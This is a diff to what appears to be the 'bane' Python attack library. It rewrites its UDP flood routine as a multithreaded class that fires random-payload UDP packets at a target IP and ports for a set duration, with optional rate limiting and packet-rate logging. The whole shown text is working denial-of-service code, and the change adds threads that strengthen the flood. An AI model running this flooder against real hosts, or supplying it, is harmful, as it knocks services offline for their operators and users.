@@ -93,47 +93,65 @@ def reset():#reset all values
    >>>bane.udp_flood(ip,ports=[21,50,80],level=2)
    
   '''
-def udp_flood(u,port=80,ports=None,interval=0.001,min_size=10,max_size=10,connection=True,duration=300,limiting=True,logs=True,returning=False):
-  global udp_counter
-  global stop
-  stop=False
-  udp_counter=0
+class udp_flood:
+ __slots__=["target","port","ports","interval","min_size","max_size","connection","duration","limiting","logs","stop","counter","start"]
+ def __init__(self,u,port=80,ports=None,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=False,logs=False):
+  self.target=u
+  self.port=port
+  self.ports=ports
+  self.interval=interval
+  self.min_size=min_size
+  self.max_size=max_size
+  self.connection=connection
+  self.duration=duration
+  self.limiting=limiting
+  self.logs=logs
+  self.stop=False
+  self.counter=0
+  self.start=time.time()
+  for x in range(threads):
+   t=threading.Thread(target=self.attack)
+   t.daemon=True
+   t.start()
+ def attack(self):
+  time.sleep(1)
   tm=time.time()
   size=0
-  while (int(time.time()-tm)<=duration):
+  while True:
+   if (int(time.time()-self.start)==self.duration):
+    break
+   if self.stop==True:
+    break
    try:
-    if ports:
-     p=random.choice(ports)
+    if self.ports:
+     p=random.choice(self.ports)
     else:
-     p=port
+     p=self.port
     s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-    if connection==True:
-     s.connect((u,p))
+    if self.connection==True:
+     s.connect((self.target,p))
     msg=''
-    for x in range(random.randint(min_size,max_size)):
+    for x in range(random.randint(self.min_size,self.max_size)):
      msg+=random.choice(lis)
     if len(msg)>1400:
        msg=msg[0:1400]#make sure all payloads' sizes are on the right range
-    s.sendto((msg.encode('utf-8')),(u,p))
+    s.sendto((msg.encode('utf-8')),(self.target,p))
     size+=len(msg)
-    udp_counter+=1
-    if((logs==True) and (int(time.time()-tm)==1)):
-     sys.stdout.write("\rPackets: {} | Bytes/s: {}   ".format(udp_counter,size))
+    self.counter+=1
+    if((self.logs==True) and (int(time.time()-tm)==1)):
+     sys.stdout.write("\rPackets: {} | Bytes/s: {}   ".format(self.counter,size))
      sys.stdout.flush()
      tm=time.time()
      size=0
-    if limiting==True:
-     time.sleep(interval)
-   except KeyboardInterrupt:
-    break
-   except Exception as e:
+    if self.limiting==True:
+     time.sleep(self.interval)
+   except:
+    pass
     try:
-     time.sleep(interval)
+     time.sleep(self.interval)
     except:
      pass
-  print('')
-  if returning==True:
-   return udp_counter
+  
 class tcfld(threading.Thread):
  def run(self):
   global tcp_counter
